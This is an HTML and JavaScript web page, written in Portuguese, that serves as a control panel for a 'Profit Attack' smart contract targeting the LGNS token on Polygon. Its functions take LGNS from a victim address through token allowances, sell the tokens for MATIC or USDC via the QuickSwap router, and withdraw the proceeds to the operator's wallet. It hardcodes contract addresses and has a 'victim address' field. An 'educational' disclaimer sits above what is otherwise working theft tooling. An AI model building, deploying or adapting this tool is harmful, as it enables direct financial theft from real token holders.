<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profit Attack - Token LGNS</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bignumber.js@9.1.0/bignumber.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background: #0d1b2a; color: white; min-height: 100vh; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: #1b263b; border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .warning { background: #e63946; border: 1px solid #d90429; border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: center; }
        .section { margin-bottom: 25px; padding: 20px; border: 2px solid #415a77; border-radius: 10px; }
        h1 { text-align: center; color: #fff; margin-bottom: 30px; }
        h2 { color: #fff; margin-bottom: 15px; border-bottom: 2px solid #ff9e00; padding-bottom: 5px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #e0e1dd; }
        input, button, select { width: 100%; padding: 12px; border: 2px solid #415a77; border-radius: 8px; font-size: 16px; margin-top: 5px; background: #2a3d5a; color: white; }
        button { background: linear-gradient(135deg, #ff9e00 0%, #ff6b00 100%); color: white; border: none; cursor: pointer; font-weight: bold; }
        button:hover { opacity: 0.9; }
        button:disabled { background: #6c757d; cursor: not-allowed; }
        .profit-btn { background: linear-gradient(135deg, #2a9d8f 0%, #1d887b 100%); }
        .steal-btn { background: linear-gradient(135deg, #e63946 0%, #d90429 100%); }
        .sell-btn { background: linear-gradient(135deg, #ff9e00 0%, #ff6b00 100%); }
        .result { background: #2a3d5a; padding: 15px; border-radius: 8px; margin-top: 10px; border-left: 4px solid #ff9e00; }
        .status { padding: 10px; border-radius: 5px; text-align: center; font-weight: bold; margin-bottom: 15px; }
        .connected { background: #2a9d8f; color: white; }
        .disconnected { background: #e63946; color: white; }
        .info-box { background: #415a77; border: 1px solid #778da9; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
        .balance-display { background: #2a9d8f; color: white; border: 1px solid #1d887b; border-radius: 5px; padding: 10px; margin-top: 5px; text-align: center; font-weight: bold; }
        .contract-address { font-family: monospace; background: #2a3d5a; padding: 5px; border-radius: 3px; }
        .quick-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 10px; }
        .strategy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px; }
        .strategy-box { background: #415a77; padding: 15px; border-radius: 8px; border: 2px solid #778da9; }
        .success { color: #2a9d8f; }
        .error { color: #e63946; }
        .warning-text { color: #ff9e00; }
        .profit-display { background: linear-gradient(135deg, #2a9d8f 0%, #1d887b 100%); color: white; padding: 15px; border-radius: 8px; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üí∞ Profit Attack - Token LGNS</h1>
        
        <div class="warning">
            <h3>‚ö†Ô∏è AVISO IMPORTANTE</h3>
            <p>Esta √© uma demonstra√ß√£o EDUCACIONAL para mostrar vulnerabilidades de seguran√ßa.</p>
            <p><strong>N√ÉO USE EM REDE PRINCIPAL (MAINNET)</strong></p>
        </div>

        <div class="section">
            <h2>üîó Conex√£o</h2>
            <div id="connectionStatus" class="status disconnected">Desconectado</div>
            <button onclick="connectWallet()">Conectar Carteira</button>
            
            <div class="info-box">
                <strong>Token LGNS:</strong> <span class="contract-address">0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01</span><br>
                <strong>Contrato Profit:</strong> <span class="contract-address">0x4BCe2e1Ea00c9cB1c2fD84A3B71E0a9E7e446d2b</span><br>
                <strong>QuickSwap Router:</strong> <span class="contract-address">0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff</span>
            </div>
            
            <div class="input-group">
                <label>Seu Saldo de MATIC:</label>
                <div id="maticBalance" class="balance-display">-</div>
            </div>

            <button onclick="connectContract()" id="connectBtn">Conectar ao Contrato Profit</button>
        </div>

        <div class="section">
            <h2>üîç Verifica√ß√µes</h2>
            
            <div class="input-group">
                <label>Endere√ßo para Verificar Saldo LGNS:</label>
                <input type="text" id="checkAddress" placeholder="0x...">
                <button onclick="checkBalance()">Verificar Saldo</button>
                <div id="checkResult" class="result"></div>
            </div>

            <div class="input-group">
                <label>Verificar Permiss√£o (Allowance):</label>
                <input type="text" id="allowanceOwner" placeholder="Dono dos tokens (0x...)" value="[endere√ßo com 63 LGNS]">
                <input type="text" id="allowanceSpender" placeholder="Quem tem permiss√£o (0x...)" value="0x4BCe2e1Ea00c9cB1c2fD84A3B71E0a9E7e446d2b">
                <button onclick="checkAllowance()">Verificar Permiss√£o</button>
                <div id="allowanceResult" class="result"></div>
            </div>
        </div>

        <div class="section">
            <h2>üéØ Ataque com Lucro</h2>
            
            <div class="input-group">
                <label>Endere√ßo da V√≠tima (com LGNS):</label>
                <input type="text" id="victimAddress" placeholder="0x...">
            </div>
            
            <div class="input-group">
                <label>Quantidade de LGNS para Roubar:</label>
                <input type="number" id="attackAmount" placeholder="Ex: 63" value="1" step="0.1" min="0.1">
                <div class="quick-grid">
                    <button onclick="setAmount(1)">1 LGNS</button>
                    <button onclick="setAmount(10)">10 LGNS</button>
                    <button onclick="setAmount(63)">63 LGNS</button>
                </div>
            </div>

            <div class="strategy-grid">
                <div class="strategy-box">
                    <h3>üí∞ Roubar e Vender Automaticamente</h3>
                    <p><small>Rouba LGNS e vende automaticamente por MATIC</small></p>
                    <button onclick="stealAndSell()" id="stealSellBtn" class="profit-btn">üí∞ Roubar & Vender</button>
                </div>
                
                <div class="strategy-box">
                    <h3>üîÑ Apenas Roubar Tokens</h3>
                    <p><small>Apenas rouba LGNS (vende manualmente depois)</small></p>
                    <button onclick="stealTokensOnly()" id="stealBtn" class="steal-btn">üîÑ Apenas Roubar</button>
                </div>
                
                <div class="strategy-box">
                    <h3>üìà Vender LGNS por MATIC</h3>
                    <p><small>Vende LGNS do contrato por MATIC</small></p>
                    <button onclick="sellForMATIC()" id="sellMaticBtn" class="sell-btn">üìà Vender por MATIC</button>
                </div>
                
                <div class="strategy-box">
                    <h3>üíµ Vender LGNS por USDC</h3>
                    <p><small>Vende LGNS do contrato por USDC</small></p>
                    <button onclick="sellForUSDC()" id="sellUsdcBtn" class="sell-btn">üíµ Vender por USDC</button>
                </div>
            </div>
            
            <div id="attackResult" class="result"></div>
        </div>

        <div class="section">
            <h2>üí∏ Saldos e Lucros</h2>
            
            <div class="quick-grid">
                <div class="balance-display">
                    <div>LGNS no Contrato</div>
                    <div id="contractLGBalance">-</div>
                </div>
                <div class="balance-display">
                    <div>MATIC no Contrato</div>
                    <div id="contractMATICBalance">-</div>
                </div>
                <div class="balance-display">
                    <div>USDC no Contrato</div>
                    <div id="contractUSDCBalance">-</div>
                </div>
            </div>
            
            <button onclick="updateAllBalances()" style="margin-top: 15px;">Atualizar Todos os Saldos</button>

            <div class="quick-grid" style="margin-top: 15px;">
                <button onclick="withdrawMATIC()" class="profit-btn">üí∏ Retirar MATIC</button>
                <button onclick="withdrawUSDC()" class="profit-btn">üíµ Retirar USDC</button>
                <button onclick="withdrawLGNS()" class="profit-btn">üîÑ Retirar LGNS</button>
            </div>
        </div>

        <div class="section">
            <h2>üìä Status do Sistema</h2>
            <div id="systemStatus" class="result">
                <div id="contractStatus">Contrato: N√£o conectado</div>
                <div id="ownerStatus">Dono: N√£o verificado</div>
                <div id="profitStatus">Lucro Total: -</div>
            </div>
        </div>
    </div>

    <script>
        let web3;
        let userAccount;
        let attackContract;
        const attackContractAddress = "0x4BCe2e1Ea00c9cB1c2fD84A3B71E0a9E7e446d2b";

        // ABI do Contrato ProfitAttack
        const PROFIT_ABI = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "anonymous": false,
                "inputs": [
                    {"indexed": true, "name": "from", "type": "address"},
                    {"indexed": true, "name": "to", "type": "address"},
                    {"indexed": false, "name": "amount", "type": "uint256"}
                ],
                "name": "TokensStolen",
                "type": "event"
            },
            {
                "anonymous": false,
                "inputs": [
                    {"indexed": false, "name": "lgnsAmount", "type": "uint256"},
                    {"indexed": false, "name": "maticReceived", "type": "uint256"}
                ],
                "name": "TokensSold",
                "type": "event"
            },
            {
                "anonymous": false,
                "inputs": [
                    {"indexed": true, "name": "to", "type": "address"},
                    {"indexed": false, "name": "amount", "type": "uint256"}
                ],
                "name": "ProfitWithdrawn",
                "type": "event"
            },
            {
                "inputs": [],
                "name": "VULNERABLE_TOKEN",
                "outputs": [{"name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "contractOwner",
                "outputs": [{"name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "victim", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "stealAndSell",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "victim", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "stealTokensOnly",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "sellLGNSForMATIC",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "sellLGNSForUSDC",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "getLGNSBalance",
                "outputs": [{"name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "getMATICBalance",
                "outputs": [{"name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "getUSDCBalance",
                "outputs": [{"name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawMATIC",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawUSDC",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawLGNS",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            }
        ];

        const VULNERABLE_TOKEN = "0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01";

        function setAmount(amount) {
            document.getElementById('attackAmount').value = amount;
        }

        function convertToWei(amount) {
            return new BigNumber(amount).times(1e9).toString();
        }

        function convertFromWei(amount) {
            return new BigNumber(amount).dividedBy(1e9).toString();
        }

        async function connectWallet() {
            try {
                if (window.ethereum) {
                    web3 = new Web3(window.ethereum);
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    
                    document.getElementById('connectionStatus').className = 'status connected';
                    document.getElementById('connectionStatus').innerHTML = 
                        `Conectado: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
                    
                    await updateMaticBalance();
                    await connectContract();
                    
                } else {
                    alert('Instale o MetaMask!');
                }
            } catch (error) {
                alert('Erro: ' + error.message);
            }
        }

        async function connectContract() {
            if (!web3 || !userAccount) {
                alert('Conecte sua carteira primeiro!');
                return;
            }

            try {
                document.getElementById('connectBtn').disabled = true;
                document.getElementById('connectBtn').innerText = 'Conectando...';

                attackContract = new web3.eth.Contract(PROFIT_ABI, attackContractAddress);
                
                const owner = await attackContract.methods.contractOwner().call();
                const isOwner = owner.toLowerCase() === userAccount.toLowerCase();
                
                document.getElementById('contractStatus').innerHTML = 
                    `<span class="${isOwner ? 'success' : 'error'}">Contrato: ${attackContractAddress}</span>`;
                document.getElementById('ownerStatus').innerHTML = 
                    `<span class="${isOwner ? 'success' : 'error'}">Dono: ${isOwner ? '‚úÖ Voc√™' : '‚ùå Outra pessoa'}</span>`;
                
                if (!isOwner) {
                    alert('AVISO: Voc√™ n√£o √© o dono deste contrato!');
                }
                
                document.getElementById('connectBtn').innerText = '‚úÖ Conectado';
                await updateAllBalances();
                
            } catch (error) {
                alert('Erro ao conectar contrato: ' + error.message);
                document.getElementById('connectBtn').disabled = false;
                document.getElementById('connectBtn').innerText = 'Conectar ao Contrato Profit';
            }
        }

        async function updateMaticBalance() {
            if (!web3 || !userAccount) return;
            try {
                const balance = await web3.eth.getBalance(userAccount);
                const maticBalance = web3.utils.fromWei(balance, 'ether');
                document.getElementById('maticBalance').innerHTML = `${parseFloat(maticBalance).toFixed(4)} MATIC`;
            } catch (error) {
                console.error('Erro:', error);
            }
        }

        async function checkBalance() {
            const address = document.getElementById('checkAddress').value;
            if (!address) {
                alert('Digite um endere√ßo!');
                return;
            }

            try {
                const erc20Abi = [{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
                const tokenContract = new web3.eth.Contract(erc20Abi, VULNERABLE_TOKEN);
                const balance = await tokenContract.methods.balanceOf(address).call();
                const balanceLGNS = convertFromWei(balance);
                
                let result = `<strong>Saldo:</strong> ${parseFloat(balanceLGNS).toLocaleString()} LGNS<br>`;
                
                if (attackContract) {
                    const allowance = await tokenContract.methods.allowance(address, attackContractAddress).call();
                    const allowanceLGNS = convertFromWei(allowance);
                    result += `<strong>Permiss√£o para contrato:</strong> ${parseFloat(allowanceLGNS).toLocaleString()} LGNS<br>`;
                    result += `<span class="${allowanceLGNS > 0 ? 'success' : 'warning-text'}">${allowanceLGNS > 0 ? '‚úÖ Tem permiss√£o' : '‚ö†Ô∏è Sem permiss√£o'}</span>`;
                }
                
                document.getElementById('checkResult').innerHTML = result;
            } catch (error) {
                document.getElementById('checkResult').innerHTML = 'Erro: ' + error.message;
            }
        }

        async function checkAllowance() {
            const owner = document.getElementById('allowanceOwner').value;
            const spender = document.getElementById('allowanceSpender').value;
            
            if (!owner || !spender) {
                alert('Preencha ambos os endere√ßos!');
                return;
            }

            try {
                const erc20Abi = [{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
                const tokenContract = new web3.eth.Contract(erc20Abi, VULNERABLE_TOKEN);
                const allowance = await tokenContract.methods.allowance(owner, spender).call();
                const allowanceLGNS = convertFromWei(allowance);
                
                document.getElementById('allowanceResult').innerHTML = 
                    `<strong>Permiss√£o:</strong> ${parseFloat(allowanceLGNS).toLocaleString()} LGNS<br>
                     <span class="${allowanceLGNS > 0 ? 'success' : 'warning-text'}">${allowanceLGNS > 0 ? '‚úÖ Pode roubar' : '‚ö†Ô∏è N√£o pode roubar'}</span>`;
            } catch (error) {
                document.getElementById('allowanceResult').innerHTML = 'Erro: ' + error.message;
            }
        }

        async function stealAndSell() {
            if (!validateInputs()) return;

            const victim = document.getElementById('victimAddress').value;
            const amount = document.getElementById('attackAmount').value;

            disableButtons(true);
            document.getElementById('attackResult').innerHTML = 'üí∞ Roubando e vendendo...';

            try {
                const amountInWei = convertToWei(amount);
                await attackContract.methods.stealAndSell(victim, amountInWei).send({ from: userAccount });
                
                document.getElementById('attackResult').innerHTML = 
                    '‚úÖ Sucesso!<br>' +
                    `üí∞ ${amount} LGNS roubados e vendidos por MATIC<br>` +
                    `üë§ V√≠tima: ${victim}<br>` +
                    `<small>Verifique o saldo de MATIC no contrato</small>`;
                
                await updateAllBalances();
                
            } catch (error) {
                document.getElementById('attackResult').innerHTML = '‚ùå Erro: ' + error.message;
            } finally {
                disableButtons(false);
            }
        }

        async function stealTokensOnly() {
            if (!validateInputs()) return;

            const victim = document.getElementById('victimAddress').value;
            const amount = document.getElementById('attackAmount').value;

            disableButtons(true);
            document.getElementById('attackResult').innerHTML = 'üîÑ Roubando tokens...';

            try {
                const amountInWei = convertToWei(amount);
                await attackContract.methods.stealTokensOnly(victim, amountInWei).send({ from: userAccount });
                
                document.getElementById('attackResult').innerHTML = 
                    '‚úÖ Tokens roubados!<br>' +
                    `üîÑ ${amount} LGNS transferidos para o contrato<br>` +
                    `üë§ V√≠tima: ${victim}<br>` +
                    `<small>Agora voc√™ pode vender por MATIC ou USDC</small>`;
                
                await updateAllBalances();
                
            } catch (error) {
                document.getElementById('attackResult').innerHTML = '‚ùå Erro: ' + error.message;
            } finally {
                disableButtons(false);
            }
        }

        async function sellForMATIC() {
            const amount = document.getElementById('attackAmount').value;
            await executeSell('sellLGNSForMATIC', amount, 'MATIC');
        }

        async function sellForUSDC() {
            const amount = document.getElementById('attackAmount').value;
            await executeSell('sellLGNSForUSDC', amount, 'USDC');
        }

        async function executeSell(fnName, amount, currency) {
            if (!attackContract) {
                alert('Contrato n√£o conectado!');
                return;
            }

            disableButtons(true);
            document.getElementById('attackResult').innerHTML = `üìà Vendendo por ${currency}...`;

            try {
                const amountInWei = convertToWei(amount);
                await attackContract.methods[fnName](amountInWei).send({ from: userAccount });
                
                document.getElementById('attackResult').innerHTML = 
                    `‚úÖ Venda conclu√≠da!<br>` +
                    `üìà ${amount} LGNS vendidos por ${currency}<br>` +
                    `<small>Verifique o saldo de ${currency} no contrato</small>`;
                
                await updateAllBalances();
                
            } catch (error) {
                document.getElementById('attackResult').innerHTML = '‚ùå Erro na venda: ' + error.message;
            } finally {
                disableButtons(false);
            }
        }

        function validateInputs() {
            if (!web3 || !userAccount || !attackContract) {
                alert('Conecte carteira e contrato primeiro!');
                return false;
            }

            const victim = document.getElementById('victimAddress').value;
            const amount = document.getElementById('attackAmount').value;
            
            if (!victim || !amount) {
                alert('Preencha todos os campos!');
                return false;
            }

            return true;
        }

        function disableButtons(disabled) {
            const buttons = ['stealSellBtn', 'stealBtn', 'sellMaticBtn', 'sellUsdcBtn'];
            buttons.forEach(btn => {
                const element = document.getElementById(btn);
                if (element) element.disabled = disabled;
            });
        }

        async function updateAllBalances() {
            if (!attackContract) return;
            
            try {
                const lgnsBalance = await attackContract.methods.getLGNSBalance().call();
                const maticBalance = await attackContract.methods.getMATICBalance().call();
                
                document.getElementById('contractLGBalance').innerHTML = convertFromWei(lgnsBalance) + ' LGNS';
                document.getElementById('contractMATICBalance').innerHTML = web3.utils.fromWei(maticBalance, 'ether') + ' MATIC';
                
                // Calcular lucro total aproximado
                const maticValue = parseFloat(web3.utils.fromWei(maticBalance, 'ether'));
                document.getElementById('profitStatus').innerHTML = `Lucro Total: ${maticValue.toFixed(4)} MATIC`;
                
            } catch (error) {
                console.error('Erro ao atualizar saldos:', error);
            }
        }

        async function withdrawMATIC() {
            if (!attackContract) return;
            try {
                await attackContract.methods.withdrawMATIC().send({ from: userAccount });
                alert('‚úÖ MATIC retirados para sua carteira!');
                await updateAllBalances();
                await updateMaticBalance();
            } catch (error) {
                alert('Erro: ' + error.message);
            }
        }

        async function withdrawUSDC() {
            if (!attackContract) return;
            try {
                await attackContract.methods.withdrawUSDC().send({ from: userAccount });
                alert('‚úÖ USDC retirados para sua carteira!');
                await updateAllBalances();
            } catch (error) {
                alert('Erro: ' + error.message);
            }
        }

        async function withdrawLGNS() {
            if (!attackContract) return;
            try {
                await attackContract.methods.withdrawLGNS().send({ from: userAccount });
                alert('‚úÖ LGNS retirados para sua carteira!');
                await updateAllBalances();
            } catch (error) {
                alert('Erro: ' + error.message);
            }
        }

        window.addEventListener('load', async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    const accounts = await web3.eth.getAccounts();
                    if (accounts.length > 0) {
                        userAccount = accounts[0];
                        document.getElementById('connectionStatus').className = 'status connected';
                        document.getElementById('connectionStatus').innerHTML = 
                            `Conectado: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
                        await updateMaticBalance();
                    }
                } catch (error) {
                    console.log('N√£o conectado automaticamente');
                }
            }
        });
    </script>
</body>
</html>
